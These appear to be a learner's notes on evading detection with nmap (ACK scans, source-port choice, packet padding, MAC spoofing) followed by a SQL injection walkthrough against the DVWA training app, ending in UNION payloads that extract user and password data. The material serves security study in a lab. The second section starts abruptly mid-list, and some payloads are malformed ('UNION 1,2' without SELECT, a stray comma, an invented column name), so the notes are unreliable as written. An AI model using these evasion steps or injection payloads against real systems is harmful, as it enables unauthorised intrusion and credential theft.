HOW CAN I AVOID DEFENSES USING NMAP?
	
1.	Try -sA option
a.	Stands for -ack which is the last part of the 3 way TCP handshake
b.	Can be used to bypass some rules of routers
c.	Many computers can detect the sin(first part of TCP handshake) packets being sent, so to avoid this you can just send the ack(last part of TCP handshake) which can trick the computer
d.	Usually computers will only accept sin packets from their local network, so as an outside computer it will likely not let you send a sin packet but will allow you to send an ack packet
e.	Run nmap -sA [ip address]
2.	Choose the port to send packages from
a.	Nmap usually specifies port randomly which can be a problem if the target only allows packets coming from a specific port
b.	Run nmap --source-port [number of source port] [ip address]
i.	Use when target is only allowing packets to come from specific port
3.	Bypass nmap size detection
a.	Sometimes computers will know about nmap and specify to block any packats the size of nmap packets
b.	To bypass this you can run nmap --data-length [length] [ip address]
4.	Spoofing mac address with nmap
a.	Run macchanger --show eth0 to show mac address
b.	Run nmap --spoof-mac [new desired mac address] [ip address of target]

a.	go to the SQL injection section
b.	to view source code click on view source code
3.	Type a number into the the User ID section and it will give you the first name and surname for that specific user ID
a.	EX. if type 1 then it will show admin
i.	if type 2 it should show Gordon Brown
b.	if you type a user ID and nothing shows up then it does not have a user
4.	Usually to check SQL injection type a single apostrophe (‘) and click submit
a.	if server is vulnerable then it will print an error
5.	Run in the DVWA website 2’ ORDER BY 1 #’ to find the number of columns
a.	order by 1 means there is one column and to check if there is another you run order by 2 and keep going until it does not say anything which means there are no more columns
6.	Run command 2’ UNION 1,2#’ to find the order of the columns
7.	Run command 2’ UNION SELECT database(),user() #’ to find name of users and database
8.	Run 2’ UNION SELECT schema_name,2 FROM information_schema.schemata #’ to find all configurations and information from the database 
9.	Run 2’ UNION SELECT table_name, FROM information_schema.tables WHERE table_schema = ‘dvwa’ #’ to find out how many tables and the information in the tables
a.	you can then target a specific table and, for instance, find out how many columns there are in that table
i.	Run 2’ UNION SELECT column_name_type FROM information_schema.columns WHERE table_schema = ‘dvwa’ AND table_name = ‘users’ #’
b.	to specify username, password and user ID list you can then run 2’ UNION SELECT  CONCAT(user_id,’-‘,first_name,’ ‘,last_name), CONCAT(user,’:’,password) FROM dvwa.users #’
